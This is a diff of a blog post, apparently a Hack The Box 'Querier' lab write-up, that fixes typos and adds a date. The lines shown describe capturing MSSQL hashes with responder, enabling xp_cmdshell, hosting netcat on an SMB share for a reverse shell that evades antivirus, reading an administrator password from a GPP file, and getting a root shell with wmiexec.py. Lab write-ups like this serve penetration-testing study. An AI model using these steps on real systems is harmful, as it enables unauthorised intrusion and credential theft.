@@ -1,6 +1,6 @@
 +++
 title = "HTB Querier Writeup" 
-template = "blog-page.html"
+date = 2023-07-01
 +++
 
 # HTB Querier Writeup - 7-1-2023
@@ -177,7 +177,7 @@ msdb
 volume 
 ```
 
-Consulting [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) and 0xdf's [walkthrough](https://0xdf.gitlab.io/2019/06/22/htb-querier.html) I learned about capturing hashed with responder from MSSQL.
+Consulting [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) and 0xdf's [walkthrough](https://0xdf.gitlab.io/2019/06/22/htb-querier.html) I learned about capturing hashes with responder from MSSQL.
 
 ```bash
 sudo responder -I tun0
@@ -206,7 +206,7 @@ sp_configure 'xp_cmdshell', '1'
 RECONFIGURE
 ```
 
-After this, AV was not taking to kindly to my reverse shell attempts to I had to learn a different way. We can host netcat off of an smb share and execute it from there.
+After this, AV was not taking very kindly to my reverse shell attempts so I had to learn a different way. We can host netcat off of an smb share and execute it from there.
 
 ```cmd
 smbserver.py -smb2support a .
@@ -260,7 +260,7 @@ File      : C:\ProgramData\Microsoft\Group
             Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
 ```
 
-Aside from the administrator password just being, there... there are also some other avenues to explore like token impersonation or Potato attacks because of SeImpersonate. I tried the reported service abuse but never got it working. The DLL hijacking will not work unless we can start and stop the service.
+Aside from the administrator password just being, there... in the PowerUp from a GPP file there are also some other avenues to explore like token impersonation or Potato attacks because of SeImpersonate. I tried the reported service abuse but never got it working. The DLL hijacking will not work unless we can start and stop the service.
 
 wmiexec.py was what worked to ultimately give us a root shell.
 
